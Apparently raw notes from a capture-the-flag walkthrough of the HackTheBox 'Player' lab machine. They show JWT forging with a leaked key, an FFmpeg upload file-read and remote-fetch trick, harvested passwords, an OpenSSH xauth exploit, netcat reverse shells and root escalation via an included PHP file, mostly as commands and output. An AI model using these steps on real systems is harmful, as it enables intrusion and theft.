@@ -1,0 +1,459 @@
+<form action="dee8dc8a47256c64630d803a4c40786c.php" id="fh5co-subscribe">
+									<div class="form-group">
+										<input type="text" class="form-control" placeholder="Enter your email">
+										<input type="submit" value="Send" class="btn btn-primary">
+										<p class="tip">Please enter your email address for early access.</p>
+
+
+
+
+root@kali:~/HTB/Player# curl -v http://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786c.php
+* Expire in 0 ms for 6 (transfer 0x55e70f8cedd0)
+*   Trying 10.10.10.145...
+* TCP_NODELAY set
+* Expire in 200 ms for 4 (transfer 0x55e70f8cedd0)
+* Connected to 10.10.10.145 (10.10.10.145) port 80 (#0)
+> GET /launcher/dee8dc8a47256c64630d803a4c40786c.php HTTP/1.1
+> Host: 10.10.10.145
+> User-Agent: curl/7.64.0
+> Accept: */*
+> 
+< HTTP/1.1 302 Found
+< Date: Sat, 06 Jul 2019 22:02:12 GMT
+< Server: Apache/2.4.7 (Ubuntu)
+< X-Powered-By: PHP/5.5.9-1ubuntu4.26
+< Set-Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; expires=Mon, 05-Aug-2019 22:02:12 GMT; Max-Age=2592000; path=/
+< Location: index.html
+< Content-Length: 0
+< Content-Type: text/html
+< 
+* Connection #0 to host 10.10.10.145 left intact
+
+
+
+JWT
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU
+
+
+Token header values:
+[+] typ = JWT
+[+] alg = HS256
+
+Token payload values:
+[+] project = PlayBuff
+[+] access_code = C0B137FE2D792459F26FF763CCE44574A5B5AB03
+
+
+view-source:http://10.10.10.145/launcher/js/simplebuff.js
+var feedback = $.ajax({
+        type: "GET",
+        url: "/launcher/dee8dc8a47256c64630d803a4c40786e.php",
+        async: false
+
+
+
+CHECKING FOR BACKUP FILES
+root@kali:~/HTB/Player# curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
+<?php
+require 'vendor/autoload.php';
+
+use \Firebase\JWT\JWT;
+
+if(isset($_COOKIE["access"]))
+{
+	$key = '_S0_R@nd0m_P@ss_';
+	$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
+	if($decoded->access_code === "0E76658526655756207688271159624026011393")
+	{
+		header("Location: 7F2xxxxxxxxxxxxx/");
+	}
+	else
+	{
+		header("Location: index.html");
+	}
+}
+else
+{
+	$token_payload = [
+	  'project' => 'PlayBuff',
+	  'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
+	];
+	$key = '_S0_R@nd0m_P@ss_';
+	$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
+	$cookiename = 'access';
+	setcookie('access',$jwt, time() + (86400 * 30), "/");
+	header("Location: index.html");
+}
+
+?>
+
+
+FOLLOWING THE PHP CODE ABOVE
+>>> import jwt
+>>> fp = open("b64coded", "r")
+>>> jwt.encode({"project":"PlayBuff", "access_code":"0E76658526655756207688271159624026011393"}, fp.read(), algorithm="HS256")
+'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.GgZP6ZYiWPFtzyHxGVn6Cl_PFkt0UpBe8cTyTF13ot4'
+Put jwt in cookie and goto http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
+it will redirect to
+http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/
+
+
+
+
+ENUMERATE SUBDOMAINS
+root@kali:~/HTB/Player# wfuzz -w /root/toolbox/morewordlists/subdomains.txt --sc 200 -H "Host: FUZZ.player.htb" http://10.10.10.145 
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.145/
+Total requests: 4998
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000019:  C=200     86 L	     229 W	   5243 Ch	  "dev"
+000067:  C=200     63 L	     180 W	   1470 Ch	  "staging"
+000070:  C=200    259 L	     714 W	   9513 Ch	  "chat"
+
+Total time: 148.7428
+Processed Requests: 4998
+Filtered Requests: 4995
+Requests/sec.: 33.60160
+
+
+Found chats at chats.player.htb
+They mentioned our staging exposing some sensitive files and main domain exposing source code which allowing them to access our product before release. Currently our team working on the fix.
+
+
+
+FFMPEG Unrestricted File Upload
+
+root@kali:~/toolbox/ffmpeg# python3 gen_avi.py file:///var/www/staging/contact.php fileread.avi
+upload fileread.avi to upload panel and open as video, not save.
+get output
+
+
+root@kali:~/toolbox/ffmpeg# python3 gen_avi.py http://10.10.16.57/shell.php file.avi
+root@kali:~/HTB/Player/www# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.145 - - [16/Jul/2019 12:33:46] "GET /shell.php HTTP/1.1" 200 -
+
+Read creds in config file
+root@kali:~/toolbox/ffmpeg# python3 gen_avi.py file:///var/www/backup/service_config getconfig.avi
+
+username: telegen
+pass: d-bC|jC!2uepS/w
+
+root@kali:~/HTB/Player# ssh -p 6686 telegen@player.htb
+The authenticity of host '[player.htb]:6686 ([10.10.10.145]:6686)' can't be established.
+ECDSA key fingerprint is SHA256:oAcCXvit3SHvyq7nuvWntLq+Q+mGlAg8301zhKnJmPM.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[player.htb]:6686,[10.10.10.145]:6686' (ECDSA) to the list of known hosts.
+telegen@player.htb's password: 
+Last login: Tue Jul 16 23:15:48 2019 from 10.10.13.166
+Environment:
+  USER=telegen
+  LOGNAME=telegen
+  HOME=/home/telegen
+  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+  MAIL=/var/mail/telegen
+  SHELL=/usr/bin/lshell
+  SSH_CLIENT=10.10.16.57 58350 6686
+  SSH_CONNECTION=10.10.16.57 58350 10.10.10.145 6686
+  SSH_TTY=/dev/pts/0
+  TERM=xterm-256color
+========= PlayBuff ==========
+Welcome to Staging Environment
+
+
+
+Using OpenSSH 7.2pq auth exploit
+root@kali:~/HTB/Player# python 39569.py player.htb 6686 'telegen' 'd-bC|jC!2uepS/w' 
+INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686
+INFO:__main__:connected!
+INFO:__main__:
+Available commands:
+    .info
+    .readfile <path>
+    .writefile <path> <data>
+    .exit .quit
+    <any xauth command or type help>
+
+#> .readfile user.txt
+DEBUG:__main__:auth_cookie: 'xxxx\nsource user.txt\n'
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:30e47abe9e315c0c39462d0cf71c0f48
+#> 
+
+#> .readfile /var/www/staging/fix.php
+DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:<?php
+class
+protected
+protected
+protected
+public
+return
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+if($result
+static::failed($test_name);
+}
+static::passed($test_name);
+}
+}
+public
+if(!$username){
+$username
+$password
+}
+//modified
+//for
+//fix
+//peter
+//CQXpm\z)G5D#%S$y=
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+echo
+echo
+echo
+}
+private
+echo
+static::$failed++;
+}
+private
+static::character(".");
+static::$passed++;
+}
+private
+echo
+static::$last_echoed
+}
+private
+if(static::$last_echoed
+echo
+static::$last_echoed
+}
+}
+#> 
+
+peter's creds works on dev.player.htb
+create a project with absolute path /var/www/demo
+upload shell
+got /shell.php
+
+root@kali:~/HTB/Player# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.57] from player.htb [10.10.10.145] 35136
+Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 16:38:59 up 13 min,  1 user,  load average: 10.62, 6.71, 3.30
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+telegen  pts/0    10.10.13.118     16:26    2:19   0.17s  0.17s /usr/bin/python /usr/bin/lshell
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+$ python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@player:/$ whoami
+whoami
+www-data
+www-data@player:/$
+www-data@player:/$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@player:/$ env
+env
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_RUN_USER=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PWD=/
+APACHE_RUN_GROUP=www-data
+LANG=C
+SHLVL=1
+APACHE_LOCK_DIR=/var/lock/apache2
+APACHE_RUN_DIR=/var/run/apache2
+_=/usr/bin/env
+
+
+www-data@player:/$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+<-E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'                        
+root
+www-data@player:/$ uname -a
+uname -a
+Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+www-data@player:/$ 
+root       370  0.0  0.0  19488   168 ?        S    16:25   0:00 upstart-udev-bridge --daemon
+root       374  0.0  0.3  51856  3544 ?        Ss   16:25   0:00 /lib/systemd/systemd-udevd --daemon
+root       468  0.0  0.4  48876  4544 ?        Ss   16:25   0:00 /lib/systemd/systemd --system
+root       471  0.0  0.3  43464  3268 ?        Ss   16:25   0:00 /lib/systemd/systemd-logind
+root       490  0.0  4.9 121800 50256 ?        Ss   16:25   0:00 /lib/systemd/systemd-journald
+root       491  0.0  0.0      0     0 ?        S    16:25   0:00 [kauditd]
+root       498  0.0  0.1  15420  1456 ?        S    16:25   0:00 upstart-file-bridge --daemon
+root       563  0.0  0.0      0     0 ?        S<   16:25   0:00 [ttm_swap]
+root       858  0.0  0.1  15668  1868 ?        S    16:25   0:00 upstart-socket-bridge --daemon
+root      1018  0.0  0.2  15828  2040 tty4     Ss+  16:25   0:00 /sbin/getty -8 38400 tty4
+root      1021  0.0  0.1  15828  2020 tty5     Ss+  16:25   0:00 /sbin/getty -8 38400 tty5
+root      1026  0.0  0.1  15828  2004 tty2     Ss+  16:25   0:00 /sbin/getty -8 38400 tty2
+root      1027  0.0  0.1  15828  2032 tty3     Ss+  16:25   0:00 /sbin/getty -8 38400 tty3
+root      1030  0.0  0.1  15828  2000 tty6     Ss+  16:25   0:00 /sbin/getty -8 38400 tty6
+root      1056  0.0  0.5  61392  5464 ?        Ss   16:25   0:00 /usr/sbin/sshd -D
+root      1060  0.0  0.2  23664  2264 ?        Ss   16:25   0:00 cron
+root      1061  0.0  0.2  59648  2956 ?        S    16:25   0:00 CRON
+root      1065  0.0  0.0   4456   772 ?        Ss   16:25   0:00 /bin/sh -c /etc/init.d/dothis.sh
+root      1066  0.0  0.3  12568  3136 ?        S    16:25   0:00 /bin/bash /etc/init.d/dothis.sh
+root      1068  0.0  0.4  28620  4400 ?        S    16:25   0:00 sshd: telegen [priv]                                                        
+root      1182  0.0  0.1   4380  1628 ?        Ss   16:25   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
+root      1194  0.0  2.1 280864 22280 ?        Ss   16:25   0:00 /usr/sbin/apache2 -k start
+root      1239  0.0  0.1  15828  2032 tty1     Ss+  16:25   0:00 /sbin/getty -8 38400 tty1
+root      2914  0.0  0.4  28620  4324 ?        S    16:56   0:00 sshd: telegen [priv]                                                        
+root      2937  0.0  0.4  26060  4416 ?        S    16:57   0:00 /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d
+root      3051  0.0  0.0   7208   644 ?        S    16:59   0:00 sleep 5
+
+
+www-data@player:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/local/libexec/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/mtr
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/bin/ping
+/bin/fusermount
+/bin/su
+/bin/ping6
+/bin/mount
+/bin/umount
+
+
+www-data@player:/$ find / -perm -2000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+/usr/bin/ssh-agent
+/usr/bin/mail-unlock
+/usr/bin/dotlockfile
+/usr/bin/at
+/usr/bin/screen
+/usr/bin/chage
+/usr/bin/mail-touchlock
+/usr/bin/expiry
+/usr/bin/mlocate
+/usr/bin/mail-lock
+/usr/bin/crontab
+/usr/bin/wall
+/usr/bin/bsd-write
+/usr/sbin/uuidd
+/sbin/unix_chkpwd
+www-data@player:/$ 
+
+
+www-data@player:/$ cat var/lib/playbuff/buff.php
+cat var/lib/playbuff/buff.php
+<?php
+include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
+class playBuff
+{
+	public $logFile="/var/log/playbuff/logs.txt";
+	public $logData="Updated";
+
+	public function __wakeup()
+	{
+		file_put_contents(__DIR__."/".$this->logFile,$this->logData);
+	}
+}
+$buff = new playBuff();
+$serialbuff = serialize($buff);
+$data = file_get_contents("/var/lib/playbuff/merge.log");
+if(unserialize($data))
+{
+	$update = file_get_contents("/var/lib/playbuff/logs.txt");
+	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
+	if($query)
+	{
+		echo 'Update Success with serialized logs!';
+	}
+}
+else
+{
+	file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
+	$update = file_get_contents("/var/lib/playbuff/logs.txt");
+	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
+	if($query)
+	{
+		echo 'Update Success!';
+	}
+}
+?>
+www-data@player:/$ 
+
+$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "";
+$dbname = "integrity";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+?>
+$ 
+
+www-data@player:/$ ls -la /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+<var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php                  
+-rw-r--r-- 1 www-data www-data 286 Mar 25 01:12 /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+put reverse shell on shell
+rename to shell to dee8dc8a47256c64630d803a4c40786g.php
+and
+www-data@player:/$ cp /var/www/demo/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/
+<www/demo/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/       
+
+root@kali:~/HTB/Player# nc -lvp 1338
+listening on [any] 1338 ...
+connect to [10.10.16.57] from player.htb [10.10.10.145] 38474
+Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 18:08:02 up 8 min,  3 users,  load average: 0.00, 0.08, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+telegen  pts/0    10.10.13.118     18:03    4:47   0.03s  0.03s /usr/bin/python /usr/bin/lshell
+telegen  pts/1    10.10.13.120     18:02   29.00s  0.06s  0.06s /usr/bin/python /usr/bin/lshell
+telegen  pts/5    10.10.14.195     18:05    2.00s  0.04s  0.04s /usr/bin/python /usr/bin/lshell
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+7dfc49f8f9955e10d4a58745c5ddf49c
+
